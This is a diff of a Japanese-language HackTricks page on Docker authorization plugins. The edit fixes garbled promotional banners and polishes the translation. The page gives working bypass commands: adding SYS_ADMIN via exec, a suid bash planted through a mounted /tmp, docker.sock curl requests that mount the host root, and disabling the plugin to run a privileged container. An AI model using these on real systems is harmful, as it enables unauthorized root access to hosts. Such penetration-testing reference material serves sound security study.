@@ -1,24 +1,20 @@
-{% hnnt styte=" acceas" %}
-GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
-Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dotsilp>
+<details>
 
-<oummpr>SupportHackTricks</smmay>
+<summary>Support HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
-* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
 
 
-**Dockerの**標準**認可**モデルは**全か無か**です。Dockerデーモンにアクセスする権限を持つユーザーは、**任意の**Dockerクライアント**コマンド**を**実行**できます。DockerのエンジンAPIを使用してデーモンに接続する呼び出し元にも同様のことが言えます。**より高いアクセス制御**が必要な場合は、**認可プラグイン**を作成し、Dockerデーモンの設定に追加できます。認可プラグインを使用することで、Docker管理者はDockerデーモンへのアクセスを管理するための**詳細なアクセス**ポリシーを**設定**できます。
+**Dockerの**標準**認可**モデルは**全か無か**です。Dockerデーモンにアクセスする権限を持つユーザーは、**任意の**Dockerクライアント**コマンド**を**実行**できます。DockerのエンジンAPIを使用してデーモンに接続する呼び出し元についても同様です。**より高いアクセス制御**が必要な場合は、**認可プラグイン**を作成し、Dockerデーモンの設定に追加できます。認可プラグインを使用することで、Docker管理者はDockerデーモンへのアクセスを管理するための**詳細なアクセス**ポリシーを**設定**できます。
 
 # 基本アーキテクチャ
 
@@ -26,7 +22,7 @@ Docker Authプラグインは、**外部**の**プラグイン**であり、**�
 
 **[以下の情報はドキュメントからのものです](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-**HTTP** **リクエスト**がCLIまたはエンジンAPIを介してDocker**デーモン**に送信されると、**認証** **サブシステム**はリクエストをインストールされた**認証** **プラグイン**に**渡します**。リクエストにはユーザー（呼び出し元）とコマンドコンテキストが含まれています。**プラグイン**は、リクエストを**許可**するか**拒否**するかを決定する責任があります。
+**HTTP** **リクエスト**がCLIまたはエンジンAPIを介してDocker **デーモン**に送信されると、**認証** **サブシステム**はリクエストをインストールされた**認証** **プラグイン**に**渡します**。リクエストにはユーザー（呼び出し元）とコマンドコンテキストが含まれています。**プラグイン**は、リクエストを**許可**するか**拒否**するかを決定する責任があります。
 
 以下のシーケンス図は、許可と拒否の認可フローを示しています：
 
@@ -34,9 +30,9 @@ Docker Authプラグインは、**外部**の**プラグイン**であり、**�
 
 ![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-プラグインに送信される各リクエストには、**認証されたユーザー、HTTPヘッダー、およびリクエスト/レスポンスボディ**が含まれます。**ユーザー名**と**使用された認証方法**のみがプラグインに渡されます。最も重要なのは、**ユーザーの** **資格情報**やトークンは渡されないことです。最後に、**すべてのリクエスト/レスポンスボディが**認可プラグインに送信されるわけではありません。`Content-Type`が`text/*`または`application/json`であるリクエスト/レスポンスボディのみが送信されます。
+プラグインに送信される各リクエストには、**認証されたユーザー、HTTPヘッダー、およびリクエスト/レスポンスボディ**が含まれます。**ユーザー名**と**使用された認証方法**のみがプラグインに渡されます。最も重要なことは、**ユーザーの** **資格情報**やトークンは渡されないことです。最後に、**すべてのリクエスト/レスポンスボディが**認可プラグインに送信されるわけではありません。`Content-Type`が`text/*`または`application/json`であるリクエスト/レスポンスボディのみが送信されます。
 
-HTTP接続をハイジャックする可能性のあるコマンド（`HTTP Upgrade`）に対しては、`exec`のように、認可プラグインは最初のHTTPリクエストに対してのみ呼び出されます。プラグインがコマンドを承認すると、その後のフローには認可が適用されません。具体的には、ストリーミングデータは認可プラグインに渡されません。`logs`や`events`のようにチャンク化されたHTTPレスポンスを返すコマンドに対しては、HTTPリクエストのみが認可プラグインに送信されます。
+HTTP接続をハイジャックする可能性のあるコマンド（`HTTP Upgrade`）については、`exec`のように、認可プラグインは最初のHTTPリクエストに対してのみ呼び出されます。プラグインがコマンドを承認すると、その後のフローには認可が適用されません。具体的には、ストリーミングデータは認可プラグインに渡されません。`logs`や`events`のようにチャンク化されたHTTPレスポンスを返すコマンドについては、HTTPリクエストのみが認可プラグインに送信されます。
 
 リクエスト/レスポンス処理中に、一部の認可フローはDockerデーモンに追加のクエリを行う必要がある場合があります。そのようなフローを完了するために、プラグインは通常のユーザーと同様にデーモンAPIを呼び出すことができます。これらの追加クエリを有効にするために、プラグインは管理者が適切な認証とセキュリティポリシーを設定できる手段を提供する必要があります。
 
@@ -48,7 +44,7 @@ HTTP接続をハイジャックする可能性のあるコマンド（`HTTP Upgr
 
 ## Twistlock AuthZ Broker
 
-プラグイン[**authz**](https://github.com/twistlock/authz)を使用すると、**リクエストを認可するために**プラグインが**読み取る**シンプルな**JSON**ファイルを作成できます。したがって、どのAPIエンドポイントが各ユーザーに到達できるかを非常に簡単に制御する機会を提供します。
+プラグイン[**authz**](https://github.com/twistlock/authz)を使用すると、**リクエストを認可するためにプラグインが**読み取る**シンプルな**JSON**ファイルを作成できます。したがって、どのAPIエンドポイントが各ユーザーに到達できるかを非常に簡単に制御する機会を提供します。
 
 これは、アリスとボブが新しいコンテナを作成できるようにする例です：`{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
@@ -60,7 +56,7 @@ HTTP接続をハイジャックする可能性のあるコマンド（`HTTP Upgr
 
 `README`と`plugin.go`のコードを読んで、どのように機能しているかを理解してください。
 
-# Docker Authプラグインバイパス
+# Docker Auth Plugin Bypass
 
 ## アクセスの列挙
 
@@ -68,7 +64,7 @@ HTTP接続をハイジャックする可能性のあるコマンド（`HTTP Upgr
 
 この列挙を行うには、**ツール**[**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**を使用できます。**
 
-## 許可されていない`run --privileged`
+## 許可されていない `run --privileged`
 
 ### 最小権限
 ```bash
@@ -96,7 +92,7 @@ docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a3
 ```
 Now, the user can escape from the container using any of the [**previously discussed techniques**](./#privileged-flag) and **権限を昇格させる** inside the host.
 
-## 書き込み可能なフォルダーをマウントする
+## 書き込み可能なフォルダーをマウント
 
 In this case the sysadmin **ユーザーが `--privileged` フラグを使用してコンテナを実行することを禁止した** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
 ```bash
@@ -108,9 +104,9 @@ host> /tmp/bash
 -p #This will give you a shell as root
 ```
 {% hint style="info" %}
-注意してください、`/tmp` フォルダーをマウントできないかもしれませんが、**別の書き込み可能なフォルダー**をマウントできます。書き込み可能なディレクトリを見つけるには、次のコマンドを使用します: `find / -writable -type d 2>/dev/null`
+注意してください、`/tmp` フォルダーをマウントできないかもしれませんが、**別の書き込み可能なフォルダー**をマウントできます。書き込み可能なディレクトリを見つけるには、`find / -writable -type d 2>/dev/null` を使用してください。
 
-**Linuxマシンのすべてのディレクトリが suid ビットをサポートするわけではありません！** suid ビットをサポートするディレクトリを確認するには、`mount | grep -v "nosuid"` を実行します。例えば、通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`、および `/var/lib/lxcfs` は suid ビットをサポートしていません。
+**Linuxマシンのすべてのディレクトリが suid ビットをサポートするわけではありません！** suid ビットをサポートするディレクトリを確認するには、`mount | grep -v "nosuid"` を実行してください。例えば、通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`、および `/var/lib/lxcfs` は suid ビットをサポートしていません。
 
 また、**`/etc`** または **設定ファイルを含む他のフォルダー** を **マウントできる** 場合、ホストで **悪用するために** それらを変更することができ、特権を昇格させることができます（おそらく `/etc/shadow` を変更することによって）。
 {% endhint %}
@@ -119,14 +115,14 @@ host> /tmp/bash
 
 このプラグインを設定する sysadmin の責任は、各ユーザーがどのアクションをどの特権で実行できるかを制御することです。したがって、管理者がエンドポイントと属性に対して **ブラックリスト** アプローチを取ると、攻撃者が **特権を昇格させる** 可能性のある **いくつかを忘れてしまう** かもしれません。
 
-Docker API を確認するには、[https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) を参照してください。
+Docker API を確認するには [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
 ## チェックされていない JSON 構造
 
 ### ルートのバインド
 
 sysadmin が Docker ファイアウォールを設定したときに、[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) の "**Binds**" のような **重要なパラメータ** を **忘れてしまった** 可能性があります。\
-次の例では、この誤設定を悪用して、ホストのルート (/) フォルダーをマウントするコンテナを作成して実行することができます:
+次の例では、この誤設定を悪用して、ホストのルート (/) フォルダーをマウントするコンテナを作成して実行することができます：
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -148,7 +144,7 @@ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '
 ```
 ### Mounts in root
 
-**Binds in root**と同じ指示に従い、Docker APIにこの**リクエスト**を実行します:
+**Binds in root**と同様の指示に従い、Docker APIにこの**request**を実行します:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
@@ -188,30 +184,23 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
+Remember to **再度プラグインを有効にすることを忘れないでください**, or a **dockerサービスの再起動は機能しません**!
 
 ## Auth Plugin Bypass writeups
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## References
-{% hnt stye="acceas" %}
-AWS ハッキング実践:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTricks AWS Red Team Expert (ARTE)**](a-size="line">[**HackTricks Training AWS Red Team**](https://github.com/sponsors/carlospolop)!haktick\_ive\
-Learn & practice GCP<img src="/.gibok/asts/gte.g"lt="" aa-iz="le">[**GCP Red Team Expert**](https://github.com/sponsors/carlospolop)!haktick\_ive\
-<dtil>
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<ummr>Support HackTricks</smmay>
+<details>
 
-* チェックして [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
-* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+<summary>Support HackTricks</summary>
+
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
 </details>
 {% endhint %}
